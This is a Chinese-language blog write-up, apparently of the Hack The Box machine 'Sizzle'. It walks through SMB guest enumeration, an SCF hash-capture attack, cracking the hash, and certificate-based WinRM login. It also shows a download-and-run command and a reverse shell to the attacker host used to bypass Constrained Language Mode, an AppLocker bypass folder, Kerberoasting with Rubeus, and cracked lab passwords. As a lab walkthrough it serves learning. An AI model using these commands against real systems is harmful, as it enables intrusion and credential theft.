@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="扫端口 域名：HTB.LOCAL smb逐一枚举，没用扫到用户，但是能以guest的用户并且允许了空密码查看一些共享文件 1 nxc smb 10.10.10.103 -u &#39;guest&#39; -p &#39;&#39; --shares 详细看">
+<title>Sizzle</title>
+
+<link rel='canonical' href='https://nergigantes.github.io/htb/sizzle/'>
+
+<link rel="stylesheet" href="/scss/style.min.f720cbcbc8f9265d2875caa41c2c2572405d50fc427ef4375391537c33376c29.css"><meta property='og:title' content="Sizzle">
+<meta property='og:description' content="扫端口 域名：HTB.LOCAL smb逐一枚举，没用扫到用户，但是能以guest的用户并且允许了空密码查看一些共享文件 1 nxc smb 10.10.10.103 -u &#39;guest&#39; -p &#39;&#39; --shares 详细看">
+<meta property='og:url' content='https://nergigantes.github.io/htb/sizzle/'>
+<meta property='og:site_name' content='NergiganteS&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Htb' /><meta property='article:published_time' content='2025-03-31T20:24:47&#43;08:00'/><meta property='article:modified_time' content='2025-03-31T20:25:29&#43;08:00'/><meta property='og:image' content='https://nergigantes.github.io/19.jpg' />
+<meta name="twitter:title" content="Sizzle">
+<meta name="twitter:description" content="扫端口 域名：HTB.LOCAL smb逐一枚举，没用扫到用户，但是能以guest的用户并且允许了空密码查看一些共享文件 1 nxc smb 10.10.10.103 -u &#39;guest&#39; -p &#39;&#39; --shares 详细看"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://nergigantes.github.io/19.jpg' />
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu315a7ad84d8f1f09f998948c005c5c1b_42437_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">NergiganteS&#39;s Blog</a></h1>
+            <h2 class="site-description">分享学习笔记路程</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://nergigantes.github.io/en/" >English</option>
+                                
+                                    <option value="https://nergigantes.github.io/" selected>中文</option>
+                                
+                                    <option value="https://nergigantes.github.io/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/htb/sizzle/">
+                
+                    <img src="/19.jpg" loading="lazy" alt="Featured image of post Sizzle" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" >
+                Htb
+            </a>
+        
+            <a href="/categories/%E5%9F%9F/" >
+                域
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/htb/sizzle/">Sizzle</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 31, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>扫端口</p>
+<p><img src="/htb/sizzle/1743335703330-be6d977a-4d0b-45a4-a2b7-f2c2d861b36d.png"
+	width="1165"
+	height="857"
+	srcset="/htb/sizzle/1743335703330-be6d977a-4d0b-45a4-a2b7-f2c2d861b36d_hua53212d7a771bf6914723eedc334f6ed_411213_480x0_resize_box_3.png 480w, /htb/sizzle/1743335703330-be6d977a-4d0b-45a4-a2b7-f2c2d861b36d_hua53212d7a771bf6914723eedc334f6ed_411213_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="135"
+		data-flex-basis="326px"
+	
+></p>
+<p>域名：HTB.LOCAL</p>
+<p>smb逐一枚举，没用扫到用户，但是能以guest的用户并且允许了空密码查看一些共享文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nxc smb 10.10.10.103 -u &#39;guest&#39; -p &#39;&#39; --shares
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/sizzle/1743335758517-a8e21c28-6afd-4f42-839d-a95952cf568b.png"
+	width="1222"
+	height="506"
+	srcset="/htb/sizzle/1743335758517-a8e21c28-6afd-4f42-839d-a95952cf568b_hua5ba370b7f98ab263c8b448f224cc446_294219_480x0_resize_box_3.png 480w, /htb/sizzle/1743335758517-a8e21c28-6afd-4f42-839d-a95952cf568b_hua5ba370b7f98ab263c8b448f224cc446_294219_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="579px"
+	
+></p>
+<p>详细看看这俩个共享文件夹Department Shares IPC$</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">smbclient //10.10.10.103/&#34;Department Shares&#34; -U &#34;&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>IPC$文件里没有东西，Department Shares文件夹里有，但是这样一看看不出什么东西来</p>
+<p>看其他的大佬的wp后发现思路-寻找可写文件夹-发现有个user文件夹下会删除我们写的文件-</p>
+<p>这个删除的行为相当于一次交互-利用这一点执行SCF 文件攻击</p>
+<p><a class="link" href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/"  target="_blank" rel="noopener"
+    >https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a></p>
+<p>为了方便我们把smb共享目录挂载在本地上查看</p>
+<p><strong>mount -t cifs &lt;共享路径&gt; &lt;挂载点&gt; -o &lt;选项&gt;</strong></p>
+<p><font style="color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);">mount -t cifs -o rw,username=guest,password= &lsquo;//10.10.10.103/Department Shares&rsquo; /mnt</font></p>
+<p><strong>以读写模式挂载</strong></p>
+<p>查看能写的文件夹，这里不能用find命令去看，因为我们这个文件夹是挂载的，所以最好的办法就是写一个脚本一个一个文件夹创建文件来看看能不能写文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">#!/bin/bash
+</span></span><span class="line"><span class="cl">list=$(find /mnt -type d)  # 查找 /mnt 及其子目录，返回目录列表
+</span></span><span class="line"><span class="cl">for d in $list              # 遍历每个目录
+</span></span><span class="line"><span class="cl">do
+</span></span><span class="line"><span class="cl">    touch $d/x 2&gt;/dev/null  # 尝试在该目录创建一个空文件 x，错误信息重定向到 /dev/null
+</span></span><span class="line"><span class="cl">    if [ $? -eq 0 ]         # 检查 touch 命令是否成功
+</span></span><span class="line"><span class="cl">    then
+</span></span><span class="line"><span class="cl">        echo $d &#34; is writable&#34;  # 输出可写目录
+</span></span><span class="line"><span class="cl">    fi
+</span></span><span class="line"><span class="cl">done
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/sizzle/1743338559785-12c7e91a-e06e-4b88-820b-69ddbeb567f7.png"
+	width="877"
+	height="245"
+	srcset="/htb/sizzle/1743338559785-12c7e91a-e06e-4b88-820b-69ddbeb567f7_hu9387f7eb6791f799ea5e6a56674c9bea_78903_480x0_resize_box_3.png 480w, /htb/sizzle/1743338559785-12c7e91a-e06e-4b88-820b-69ddbeb567f7_hu9387f7eb6791f799ea5e6a56674c9bea_78903_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="357"
+		data-flex-basis="859px"
+	
+></p>
+<p>我们能够在俩个文件夹下写</p>
+<p>在public文件夹中写入我们的scf攻击文件</p>
+<p>然后用responder开启smb服务并监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo responder -I tun0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>等待一会</p>
+<p><img src="/htb/sizzle/1743340350346-0c3ae0e6-c570-4f01-ae93-6f1b093aa553.png"
+	width="1208"
+	height="370"
+	srcset="/htb/sizzle/1743340350346-0c3ae0e6-c570-4f01-ae93-6f1b093aa553_hu83df304482769e2b1f6f696b8331d811_389083_480x0_resize_box_3.png 480w, /htb/sizzle/1743340350346-0c3ae0e6-c570-4f01-ae93-6f1b093aa553_hu83df304482769e2b1f6f696b8331d811_389083_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="326"
+		data-flex-basis="783px"
+	
+></p>
+<p>成功拿到amanda用户的hash，爆破一下</p>
+<p><img src="/htb/sizzle/1743340433751-708dceb5-fbb4-4c34-91e6-f9edde8c702a.png"
+	width="1204"
+	height="252"
+	srcset="/htb/sizzle/1743340433751-708dceb5-fbb4-4c34-91e6-f9edde8c702a_hu3ec23956479bf583af1594cb20b56505_124793_480x0_resize_box_3.png 480w, /htb/sizzle/1743340433751-708dceb5-fbb4-4c34-91e6-f9edde8c702a_hu3ec23956479bf583af1594cb20b56505_124793_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="477"
+		data-flex-basis="1146px"
+	
+>Ashare1972，现在我们就有了一组账号密码了</p>
+<p>但是这个用户登陆不了</p>
+<p>这里要回到信息收集的时候，那个网站能爆出一个目录，我们可以用这个账号密码登陆</p>
+<p><img src="/htb/sizzle/1743401313516-129a5587-15f5-4756-8cb6-4f5aeeb44458.png"
+	width="1167"
+	height="662"
+	srcset="/htb/sizzle/1743401313516-129a5587-15f5-4756-8cb6-4f5aeeb44458_hu2ac9338722e70e541acfb304099c9a14_176791_480x0_resize_box_3.png 480w, /htb/sizzle/1743401313516-129a5587-15f5-4756-8cb6-4f5aeeb44458_hu2ac9338722e70e541acfb304099c9a14_176791_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="176"
+		data-flex-basis="423px"
+	
+></p>
+<p><img src="/htb/sizzle/1743401396208-e8e3cad9-cc45-4705-808c-9482b7a90b40.png"
+	width="2869"
+	height="1207"
+	srcset="/htb/sizzle/1743401396208-e8e3cad9-cc45-4705-808c-9482b7a90b40_hu00bfa9535525f3a16a37e76e639ed303_347511_480x0_resize_box_3.png 480w, /htb/sizzle/1743401396208-e8e3cad9-cc45-4705-808c-9482b7a90b40_hu00bfa9535525f3a16a37e76e639ed303_347511_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="237"
+		data-flex-basis="570px"
+	
+></p>
+<p>进来后发现这里是一个可以搓证书的地方</p>
+<p>openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr</p>
+<p>先搓一个amanda.csr出来，然后拿里面的码去生成我们需要的证书</p>
+<p><img src="/htb/sizzle/1743404017624-a5ef7316-830f-4460-874a-9244bb4cea56.png"
+	width="2592"
+	height="955"
+	srcset="/htb/sizzle/1743404017624-a5ef7316-830f-4460-874a-9244bb4cea56_hu627a64cfdf3543b1810982c6b1dda835_180160_480x0_resize_box_3.png 480w, /htb/sizzle/1743404017624-a5ef7316-830f-4460-874a-9244bb4cea56_hu627a64cfdf3543b1810982c6b1dda835_180160_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="271"
+		data-flex-basis="651px"
+	
+></p>
+<p>最后使用证书和key登陆</p>
+<p><code>evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'</code></p>
+<p>上去之后上传SharpHound.exe分析一下情况，但是上传报错，那就使用Houndblood-python去扫一下</p>
+<p>分析结果发现<img src="/htb/sizzle/1743408629676-ee970be9-e521-4ede-8aca-ca4687705e0f.png"
+	width="1275"
+	height="992"
+	srcset="/htb/sizzle/1743408629676-ee970be9-e521-4ede-8aca-ca4687705e0f_hu8fb3967cf61741b5d291641a77b4c9c8_134355_480x0_resize_box_3.png 480w, /htb/sizzle/1743408629676-ee970be9-e521-4ede-8aca-ca4687705e0f_hu8fb3967cf61741b5d291641a77b4c9c8_134355_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="128"
+		data-flex-basis="308px"
+	
+></p>
+<p>mrlky用户有很大的利用价值，不仅是因为他拥有对域的DCSync权限，还因为该账户被设置了SPN</p>
+<p><img src="/htb/sizzle/1743408703588-5cf65a29-8a8b-4890-abbd-f8361472d796.png"
+	width="732"
+	height="699"
+	srcset="/htb/sizzle/1743408703588-5cf65a29-8a8b-4890-abbd-f8361472d796_hu63ea10f2a6c95511f29643c7924f62b8_55883_480x0_resize_box_3.png 480w, /htb/sizzle/1743408703588-5cf65a29-8a8b-4890-abbd-f8361472d796_hu63ea10f2a6c95511f29643c7924f62b8_55883_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="104"
+		data-flex-basis="251px"
+	
+></p>
+<p>那么接下来，就进行Kerberoasting攻击</p>
+<p>但是尝试了几次都不行，那就换一个Kerberoasting攻击方法</p>
+<p><img src="/htb/sizzle/1743409254596-23e7034c-5f4b-4ee9-ab16-b77f54a1af20.png"
+	width="1705"
+	height="260"
+	srcset="/htb/sizzle/1743409254596-23e7034c-5f4b-4ee9-ab16-b77f54a1af20_hud34124d52620a1c104ce12031b53b1d6_98239_480x0_resize_box_3.png 480w, /htb/sizzle/1743409254596-23e7034c-5f4b-4ee9-ab16-b77f54a1af20_hud34124d52620a1c104ce12031b53b1d6_98239_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="655"
+		data-flex-basis="1573px"
+	
+></p>
+<p>了解到我们可以使用<font style="color:rgb(77, 77, 77);">Rubeus请求</font></p>
+<p><font style="color:rgb(77, 77, 77);">但是我们目前无法上传文件，原因是现在是</font><strong>约束模式（Constrained Language Mode）</strong></p>
+<p><strong>$ExecutionContext.SessionState.LanguageMode</strong></p>
+<p><img src="/htb/sizzle/1743409425394-de57dbc2-bb77-460f-a3a2-753ac488b6fa.png"
+	width="1192"
+	height="111"
+	srcset="/htb/sizzle/1743409425394-de57dbc2-bb77-460f-a3a2-753ac488b6fa_hu79bcf0b9dd3da4e96067e043a8145563_22956_480x0_resize_box_3.png 480w, /htb/sizzle/1743409425394-de57dbc2-bb77-460f-a3a2-753ac488b6fa_hu79bcf0b9dd3da4e96067e043a8145563_22956_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1073"
+		data-flex-basis="2577px"
+	
+></p>
+<p>因此现在我们该突破这个约束</p>
+<p>选择利用PSByPassCLM</p>
+<p><font style="color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);">iwr -uri http://10.10.16.21:5001/PsBypassCLM.exe -outfile PsBypassCLM.exe</font></p>
+<p><font style="color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.16.21 /rport=2333 C:\Users\amanda\Documents\PsBypassCLM.exe</font></p>
+<p><img src="/htb/sizzle/1743410137482-218d3761-2acb-4b00-a31a-a8cef88ec9b3.png"
+	width="1705"
+	height="918"
+	srcset="/htb/sizzle/1743410137482-218d3761-2acb-4b00-a31a-a8cef88ec9b3_huc2ac997cf33c241ec0757dcb2d837a26_231122_480x0_resize_box_3.png 480w, /htb/sizzle/1743410137482-218d3761-2acb-4b00-a31a-a8cef88ec9b3_huc2ac997cf33c241ec0757dcb2d837a26_231122_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="445px"
+	
+></p>
+<p>现在我们就拥有了一个不被限制的shell了</p>
+<p><img src="/htb/sizzle/1743410192391-e09ecaba-bf2f-4839-8d85-0d3792064d92.png"
+	width="1949"
+	height="459"
+	srcset="/htb/sizzle/1743410192391-e09ecaba-bf2f-4839-8d85-0d3792064d92_hufcf223b559460976c0b0add2f852fbab_117993_480x0_resize_box_3.png 480w, /htb/sizzle/1743410192391-e09ecaba-bf2f-4839-8d85-0d3792064d92_hufcf223b559460976c0b0add2f852fbab_117993_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="424"
+		data-flex-basis="1019px"
+	
+></p>
+<p>现在将Rubeus文件上传,执行</p>
+<p>.\rubeus.exe kerberoast /creduser:<strong>htb.local</strong>*<em>amanda</em>* /credpassword:<strong>Ashare1972</strong></p>
+<p>又有问题了，rubeus文件被系统ban了</p>
+<ul>
+<li><strong>AppLocker 或 Windows Defender Application Control（WDAC）</strong> 阻止了 Rubeus。</li>
+<li><strong>被 Windows Defender 或其他安全工具检测为恶意软件</strong>（基于特征码或路径）。</li>
+</ul>
+<p>现在该想如何绕过这个限制</p>
+<p>经了解，可以将文件放置在这些文件夹的话，就可以执行</p>
+<p><a class="link" href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md"  target="_blank" rel="noopener"
+    >https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a></p>
+<p><img src="/htb/sizzle/1743412389796-9582c45d-8a48-46d8-89ae-b55f3a44b1ae.png"
+	width="1321"
+	height="1034"
+	srcset="/htb/sizzle/1743412389796-9582c45d-8a48-46d8-89ae-b55f3a44b1ae_hu9eefd145a3edb123b5c1ae82799dc8ef_123750_480x0_resize_box_3.png 480w, /htb/sizzle/1743412389796-9582c45d-8a48-46d8-89ae-b55f3a44b1ae_hu9eefd145a3edb123b5c1ae82799dc8ef_123750_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="127"
+		data-flex-basis="306px"
+	
+></p>
+<p>经测试，可以在</p>
+<p>C:\Windows\System32\spool\drivers\color目录下绕过策略组执行</p>
+<p><img src="/htb/sizzle/1743412432782-cc6929f2-d8c9-4d9d-9c84-2424eb16a496.png"
+	width="1561"
+	height="1010"
+	srcset="/htb/sizzle/1743412432782-cc6929f2-d8c9-4d9d-9c84-2424eb16a496_hued1aeef4fc17cf36f84c28e151902b0c_289586_480x0_resize_box_3.png 480w, /htb/sizzle/1743412432782-cc6929f2-d8c9-4d9d-9c84-2424eb16a496_hued1aeef4fc17cf36f84c28e151902b0c_289586_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="154"
+		data-flex-basis="370px"
+	
+></p>
+<p>成功拿到mrlky用户的hash，上爆破！！</p>
+<p>结果一直爆破不出来。。后来重新运行了一下结果能爆破出来了？而且俩次的hash值也不同</p>
+<p>所以，这是为啥呢。。。</p>
+<p><img src="/htb/sizzle/1743414640169-4019fb80-d5e0-422c-b5b3-36763634879f.png"
+	width="1977"
+	height="685"
+	srcset="/htb/sizzle/1743414640169-4019fb80-d5e0-422c-b5b3-36763634879f_hu46b98b484e0d3396bca9a8ff39a85661_488879_480x0_resize_box_3.png 480w, /htb/sizzle/1743414640169-4019fb80-d5e0-422c-b5b3-36763634879f_hu46b98b484e0d3396bca9a8ff39a85661_488879_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="288"
+		data-flex-basis="692px"
+	
+></p>
+<p>不管怎么说，我们现在有了mrlky的账户</p>
+<p>Football#7</p>
+<p>是时候向着最后一步发起冲击了！</p>
